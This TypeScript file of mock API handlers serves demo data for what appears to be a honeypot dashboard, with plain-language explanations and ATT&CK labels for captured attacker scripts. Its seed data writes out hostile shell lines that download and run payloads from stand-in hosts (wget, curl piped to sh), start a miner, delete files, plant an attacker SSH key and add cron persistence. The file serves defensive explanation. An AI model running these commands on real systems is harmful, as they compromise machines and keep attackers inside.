/**
 * MSW handlers for the scripts endpoints. Everything is fictional demo data: addresses are in the
 * documentation ranges, hosts are example domains, the explanations mirror what the annotation
 * base in ingest/rules/annotations writes.
 */
import { delay, http, HttpResponse, type RequestHandler } from "msw"
import type { Session } from "@/lib/api"
import type { ExplainedLine, ScriptDetail, ScriptItem, ScriptsSummary } from "@/lib/scripts"
import type { Severity } from "@/lib/severity"
import { buildFixtures } from "./fixtures"

const LATENCY_MS = 160
const HOUR = 3_600_000
const DAY = 24 * HOUR
const iso = (ms: number) => new Date(ms).toISOString().replace(".000Z", "Z")

type L = [
  raw: string,
  explanation: string,
  risk: Severity | null,
  technique?: string,
  rule?: string,
]

interface Seed {
  sensors: string[]
  sessions: number
  sources: number
  firstH: number
  lastH: number
  campaign?: [number, string]
  lines: L[]
  phrases: string
}

const DOWNLOAD: L = [
  "wget http://203.0.113.50/bins/x86",
  "Downloads a file from another server. The address is replaced by a placeholder so the same script from different servers counts as one.",
  "severe",
  "T1105",
  "download",
]
const CHMOD: L = [
  "chmod 777 x86",
  "Makes a file runnable. It is nearly always the step between download and run.",
  "severe",
  "T1222.002",
  "chmod-exec",
]
const RUN: L = [
  "./x86 ssh.exploit",
  "Runs a program from a writable folder. This is usually the file that was just downloaded.",
  "severe",
  "T1059.004",
  "run-dropped-binary",
]
const RM: L = [
  "rm -rf x86",
  "Deletes files without asking. Attackers remove their own tools and logs after use.",
  "warning",
  "T1070.004",
  "delete-recursive",
]
const UNAME: L = [
  "uname -a",
  "Shows the operating system, kernel and CPU architecture. Attackers use it to pick a download that fits the machine.",
  "info",
  "T1082",
  "uname",
]
const CPU: L = [
  "cat /proc/cpuinfo",
  "Reads hardware or operating-system details. Attackers do this to see what kind of machine they are on.",
  "info",
  "T1082",
  "read-system-files",
]
const WHOAMI: L = [
  "whoami",
  "Asks which user the attacker is, and with which privileges.",
  "info",
  "T1033",
  "whoami",
]

const SEEDS: Seed[] = [
  {
    sensors: ["ssh", "telnet"],
    sessions: 212,
    sources: 61,
    firstH: 24 * 41,
    lastH: 0.4,
    campaign: [41, "Mirai loader over Telnet #41"],
    lines: [DOWNLOAD, CHMOD, RUN, RM],
    phrases:
      "A 4-step script that downloads a file, makes it executable, runs the file it just fetched and deletes files.",
  },
  {
    sensors: ["ssh"],
    sessions: 148,
    sources: 74,
    firstH: 24 * 60,
    lastH: 0.9,
    lines: [
      UNAME,
      CPU,
      [
        "lscpu",
        "Counts processors, memory or disks. Cryptocurrency miners check this to decide whether the machine is worth using.",
        "info",
        "T1082",
        "cpu-memory",
      ],
      WHOAMI,
    ],
    phrases:
      "A 4-step script that identifies the system, reads system details, measures CPU, memory and disks and checks its privileges.",
  },
  {
    sensors: ["ssh"],
    sessions: 37,
    sources: 12,
    firstH: 30,
    lastH: 2.1,
    campaign: [52, "Crypto-miner dropper over SSH #52"],
    lines: [
      [
        "curl -s http://198.51.100.20/m.sh | sh",
        "Downloads a program and runs it straight away.",
        "severe",
        "T1105",
        "download-and-run",
      ],
      [
        "pkill -f kdevtmpfsi",
        "Stops running programs. Miners stop rival miners and security tools this way.",
        "warning",
        "T1489",
        "kill",
      ],
      [
        "nohup ./m -o stratum+tcp://pool.example.net:3333 &",
        "Keeps the next program running after the attacker disconnects.",
        "warning",
        "T1059.004",
        "nohup",
      ],
    ],
    phrases:
      "A 3-step script that downloads and runs a program, stops other programs and keeps it running in the background.",
  },
  {
    sensors: ["ssh"],
    sessions: 29,
    sources: 9,
    firstH: 24 * 3,
    lastH: 5,
    lines: [
      [
        "mkdir -p ~/.ssh",
        "Copies, moves or creates files and folders.",
        "info",
        undefined,
        "file-ops",
      ],
      [
        "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCExampleOnlyNotARealKey0123456789abcdefghijKLMNOPQRSTuvwxyzExampleOnlyNotARealKey0123456789abcdefghijKLMNOPQRSTuvwxyzExampleOnlyNotARealKey0123456789abcdefghijKLMNOPQRSTuvwxyz attacker@example' >> ~/.ssh/authorized_keys",
        "Adds the attacker's SSH key so they can log in again later without a password.",
        "severe",
        "T1098.004",
        "ssh-key-install",
      ],
      [
        "chmod 600 ~/.ssh/authorized_keys",
        "Changes who can read or run a file.",
        "notice",
        "T1222.002",
        "chmod",
      ],
    ],
    phrases:
      "A 3-step script that moves files around, installs its own SSH key and changes file permissions.",
  },
  {
    sensors: ["telnet"],
    sessions: 96,
    sources: 38,
    firstH: 24 * 20,
    lastH: 1.3,
    campaign: [41, "Mirai loader over Telnet #41"],
    lines: [
      [
        "enable",
        "A word sent to a router login to leave its restricted menu and reach a real shell. Typical of automated Telnet bots.",
        "warning",
        "T1059",
        "telnet-loader-words",
      ],
      [
        "system",
        "A word sent to a router login to leave its restricted menu and reach a real shell. Typical of automated Telnet bots.",
        "warning",
        "T1059",
        "telnet-loader-words",
      ],
      [
        "/bin/busybox ECCHI",
        "Calls BusyBox, the small toolbox found on routers and cameras. Bots use it to check which tools exist.",
        "warning",
        "T1059.004",
        "busybox",
      ],
    ],
    phrases:
      "A 3-step script that tries to reach a shell on a router and probes the device toolbox.",
  },
  {
    sensors: ["ssh", "telnet"],
    sessions: 18,
    sources: 6,
    firstH: 24 * 2,
    lastH: 26,
    lines: [
      ["frobnicate --now", "No built-in explanation for this command yet.", null],
      ["whoami", WHOAMI[1], "info", "T1033", "whoami"],
    ],
    phrases: "A 2-step script that checks its privileges.",
  },
  {
    sensors: ["ssh"],
    sessions: 11,
    sources: 3,
    firstH: 24 * 5,
    lastH: 52,
    lines: [
      [
        "crontab -l",
        "Schedules a program to run again later. A common way to survive a reboot.",
        "severe",
        "T1053.003",
        "cron",
      ],
      [
        "(crontab -l; echo '*/5 * * * * /tmp/.x/run') | crontab -",
        "Schedules a program to run again later. A common way to survive a reboot.",
        "severe",
        "T1053.003",
        "cron",
      ],
    ],
    phrases: "A 2-step script that schedules itself to run again.",
  },
  {
    sensors: ["ssh"],
    sessions: 6,
    sources: 2,
    firstH: 24 * 9,
    lastH: 24 * 4,
    lines: [
      [
        "ps aux",
        "Lists the running programs, often to find security tools or competing malware.",
        "info",
        "T1057",
        "processes",
      ],
      [
        "netstat -tulpn",
        "Shows the network interfaces, addresses and open connections.",
        "info",
        "T1016",
        "network-config",
      ],
      [
        "df -h",
        "Counts processors, memory or disks. Cryptocurrency miners check this to decide whether the machine is worth using.",
        "info",
        "T1082",
        "cpu-memory",
      ],
    ],
    phrases:
      "A 3-step script that lists running programs, inspects the network setup and measures CPU, memory and disks.",
  },
]

function build(now: number) {
  const ids = SEEDS.map((_, i) => i + 1)
  const items: ScriptItem[] = SEEDS.map((s, i) => {
    const risks = s.lines.map((l) => l[2]).filter((r): r is Severity => r !== null)
    const order: Severity[] = ["info", "notice", "warning", "severe"]
    const top = risks.reduce<Severity | null>(
      (acc, r) => (acc === null || order.indexOf(r) > order.indexOf(acc) ? r : acc),
      null,
    )
    return {
      id: ids[i] ?? i + 1,
      fingerprint: (i + 1).toString(16).padStart(64, "a3f1"),
      summary: s.phrases,
      preview: s.lines.slice(0, 3).map((l) => l[0]),
      line_count: s.lines.length,
      first_seen: iso(now - s.firstH * HOUR),
      last_seen: iso(now - s.lastH * HOUR),
      sessions: s.sessions,
      sources: s.sources,
      sensors: s.sensors,
      techniques: [...new Set(s.lines.flatMap((l) => (l[3] ? [l[3]] : [])))],
      campaign_id: s.campaign?.[0] ?? null,
      campaign_name: s.campaign?.[1] ?? null,
      risk: top,
      is_new: s.firstH < 24 * 7,
    }
  })
  return items
}

const TECHNIQUE_NAMES: Record<string, string> = {
  T1105: "Ingress Tool Transfer",
  "T1222.002": "Linux File Permissions Modification",
  "T1059.004": "Unix Shell",
  "T1070.004": "File Deletion",
  T1082: "System Information Discovery",
  T1033: "System Owner/User Discovery",
  T1489: "Service Stop",
  "T1098.004": "SSH Authorized Keys",
  T1059: "Command and Scripting Interpreter",
  "T1053.003": "Cron",
  T1057: "Process Discovery",
  T1016: "System Network Configuration Discovery",
}

function lines(seed: Seed): ExplainedLine[] {
  return seed.lines.map((l, i) => ({
    n: i + 1,
    text: l[0],
    raw: l[0],
    explanation: l[1] || "No built-in explanation for this command yet.",
    risk: l[2],
    technique: l[3] ?? null,
    technique_name: l[3] ? (TECHNIQUE_NAMES[l[3]] ?? null) : null,
    rule: l[4] ?? null,
  }))
}

function encodeCursor(offset: number) {
  return btoa(JSON.stringify({ o: offset })).replace(/=+$/, "")
}

function decodeCursor(cursor: string | null): number {
  if (!cursor) return 0
  try {
    const v = JSON.parse(atob(cursor)) as { o?: unknown }
    return typeof v.o === "number" && v.o >= 0 ? v.o : 0
  } catch {
    return 0
  }
}

export const scriptsHandlers: RequestHandler[] = [
  http.get("/api/v1/scripts/summary", async () => {
    await delay(LATENCY_MS)
    const now = Date.now()
    const items = build(now)
    const top = items.reduce((a, b) => (b.sessions > a.sessions ? b : a))
    const body: ScriptsSummary = {
      total: items.length,
      new_this_week: items.filter((i) => i.is_new).length,
      seen_today: items.filter((i) => now - Date.parse(i.last_seen) < DAY).length,
      with_campaign: items.filter((i) => i.campaign_id !== null).length,
      top_id: top.id,
      top_summary: top.summary,
      top_sessions: top.sessions,
    }
    return HttpResponse.json(body)
  }),

  http.get("/api/v1/scripts/:id/sessions", async ({ params, request }) => {
    await delay(LATENCY_MS)
    const url = new URL(request.url)
    const id = Number(params.id)
    if (!SEEDS[id - 1]) return HttpResponse.json({ detail: "script not found" }, { status: 404 })
    const pool: Session[] = buildFixtures(120, Date.now(), 7)
      .map((f) => f.session)
      .filter((s) => s.commands > 0 && (s.sensor === "ssh" || s.sensor === "telnet"))
      .filter((_, i) => i % SEEDS.length === (id - 1) % SEEDS.length)
    const offset = decodeCursor(url.searchParams.get("cursor"))
    const limit = Number(url.searchParams.get("limit") ?? 25)
    const next = offset + limit < pool.length ? encodeCursor(offset + limit) : null
    return HttpResponse.json({ items: pool.slice(offset, offset + limit), next_cursor: next })
  }),

  http.get("/api/v1/scripts/:id", async ({ params }) => {
    await delay(LATENCY_MS)
    const id = Number(params.id)
    const seed = SEEDS[id - 1]
    if (!seed) return HttpResponse.json({ detail: "script not found" }, { status: 404 })
    const now = Date.now()
    const item = build(now)[id - 1]
    if (!item) return HttpResponse.json({ detail: "script not found" }, { status: 404 })
    const explained = lines(seed)
    const body: ScriptDetail = {
      item,
      lines: explained,
      unexplained: explained.filter((l) => l.risk === null).length,
      techniques_detail: item.techniques.map((t) => ({
        id: t,
        name: TECHNIQUE_NAMES[t] ?? t,
        tactic: null,
        url: `https://attack.mitre.org/techniques/${t.replace(".", "/")}/`,
      })),
      campaign: seed.campaign
        ? { id: seed.campaign[0], name: seed.campaign[1], status: "active" }
        : null,
      demo: true,
    }
    return HttpResponse.json(body)
  }),

  http.get("/api/v1/scripts", async ({ request }) => {
    await delay(LATENCY_MS)
    const url = new URL(request.url)
    const p = url.searchParams
    let items = build(Date.now())
    const sensors = p.getAll("sensor")
    if (sensors.length) items = items.filter((i) => i.sensors.some((s) => sensors.includes(s)))
    const technique = p.get("technique")
    if (technique) items = items.filter((i) => i.techniques.includes(technique))
    const campaign = p.get("campaign_id")
    if (campaign) items = items.filter((i) => String(i.campaign_id) === campaign)
    const q = p.get("q")?.toLowerCase()
    if (q) {
      items = items.filter((i) => {
        const seed = SEEDS[i.id - 1]
        return seed?.lines.some((l) => l[0].toLowerCase().includes(q)) ?? false
      })
    }
    if (p.get("new") === "true") items = items.filter((i) => i.is_new)
    const sort = p.get("sort") ?? "recent"
    items.sort((a, b) =>
      sort === "common"
        ? b.sessions - a.sessions
        : sort === "newest"
          ? b.first_seen.localeCompare(a.first_seen)
          : b.last_seen.localeCompare(a.last_seen),
    )
    const offset = decodeCursor(p.get("cursor"))
    const limit = Number(p.get("limit") ?? 50)
    const next = offset + limit < items.length ? encodeCursor(offset + limit) : null
    return HttpResponse.json({ items: items.slice(offset, offset + limit), next_cursor: next })
  }),
]
